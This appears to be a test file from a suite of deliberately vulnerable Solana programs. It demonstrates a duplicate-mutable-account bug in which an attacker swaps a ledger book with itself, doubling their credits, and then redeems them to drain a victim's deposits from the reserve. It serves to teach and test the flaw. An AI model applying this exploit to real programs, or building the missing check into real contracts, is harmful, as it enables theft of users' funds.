/**
 * VULN 08 — Duplicate mutable accounts not rejected.
 *
 * internal_swap(from_book, to_book, amount) reads BOTH balances, then
 * writes both back. Nothing enforces from != to: passing the SAME book
 * for both roles makes the second write win (b + amount), so the caller
 * doubles their credits out of thin air and redeems them for the reserve
 * lamports of other depositors.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, connection, findPda, seedsBuf, airdrop, newFundedKeypair,
  nativeIx, sendTx, sendSelfSigned, solBalance, SystemProgram, LAMPORTS_PER_SOL,
} from "./util";

describe("vuln08 duplicate mutable accounts", () => {
  const reservePda = findPda([seedsBuf("reserve")[0]], PROG_IDS.vuln08)[0];
  const bookPdaOf = (owner: any) =>
    findPda([seedsBuf("book")[0], owner.publicKey.toBytes()], PROG_IDS.vuln08)[0];

  let victim: any, attacker: any, victimBook: any, attackerBook: any;

  const initBook = (owner: any) =>
    sendTx(
      [
        nativeIx(
          PROG_IDS.vuln08, 3, null,
          [
            { pubkey: bookPdaOf(owner), isSigner: false, isWritable: true },
            { pubkey: owner.publicKey, isSigner: true, isWritable: false },
            { pubkey: owner.publicKey, isSigner: true, isWritable: true },
            { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
          ],
        ),
      ],
      [owner],
    );

  const deposit = (owner: any, lamports: number) =>
    sendTx(
      [
        nativeIx(
          PROG_IDS.vuln08, 0, numToLe(lamports),
          [
            { pubkey: bookPdaOf(owner), isSigner: false, isWritable: true },
            { pubkey: owner.publicKey, isSigner: true, isWritable: true },
            { pubkey: reservePda, isSigner: false, isWritable: true },
            { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
          ],
        ),
      ],
      [owner],
    );

  const swap = (from: any, to: any, amount: number, signer: any) =>
    sendSelfSigned(
      [
        nativeIx(
          PROG_IDS.vuln08, 1, numToLe(amount),
          [
            { pubkey: from, isSigner: false, isWritable: true },
            { pubkey: to, isSigner: false, isWritable: true },
          ],
        ),
      ],
      signer,
    );

  const redeem = (book: any, owner: any, lamports: number) =>
    sendSelfSigned(
      [
        nativeIx(
          PROG_IDS.vuln08, 2, numToLe(lamports),
          [
            { pubkey: book, isSigner: false, isWritable: true },
            { pubkey: owner.publicKey, isSigner: false, isWritable: true },
            { pubkey: reservePda, isSigner: false, isWritable: true },
            { pubkey: SystemProgram.programId, isSigner: false, isWritable: false },
          ],
        ),
      ],
      owner,
    );

  function numToLe(n: number): Buffer {
    const b = Buffer.alloc(8);
    b.writeBigUInt64LE(BigInt(n));
    return b;
  }

  async function bookAmount(book: any): Promise<bigint> {
    return (await connection.getAccountInfo(book))!.data.readBigUInt64LE(8);
  }

  before(async () => {
    victim = await newFundedKeypair();
    attacker = await newFundedKeypair();

    // Victim backs the ledger with 1 SOL, attacker with 0.5 SOL.
    victimBook = bookPdaOf(victim);
    attackerBook = bookPdaOf(attacker);
    await initBook(victim);
    await deposit(victim, 1 * LAMPORTS_PER_SOL);
    await initBook(attacker);
    await deposit(attacker, Math.floor(0.5 * LAMPORTS_PER_SOL));
  });

  it("reserve holds 1.5 SOL of honest deposits", async () => {
    assert.equal(await solBalance(reservePda), 1.5 * LAMPORTS_PER_SOL);
  });

  it("internal_swap with the same book for both sides doubles the credits", async () => {
    await swap(attackerBook, attackerBook, 500000000, attacker); // from == to == attackerBook

    // 0.5 SOL became 1.0 SOL of internal credits with no real backing.
    assert.equal((await bookAmount(attackerBook)).toString(), "1000000000");
    assert.equal(await solBalance(reservePda), 1.5 * LAMPORTS_PER_SOL);
  });

  it("attacker redeems the fake credits for the victim's backing", async () => {
    const before = await solBalance(attacker.publicKey);
    await redeem(attackerBook, attacker, 1000000000);
    const after = await solBalance(attacker.publicKey);

    assert.equal(after - before, 1000000000 - 5000); // 5000 lamports tx fee
    assert.equal((await bookAmount(attackerBook)).toString(), "0");
    // Only 0.5 SOL of backing remains for the victim's 1 SOL.
    assert.equal(await solBalance(reservePda), 500000000);
  });
});
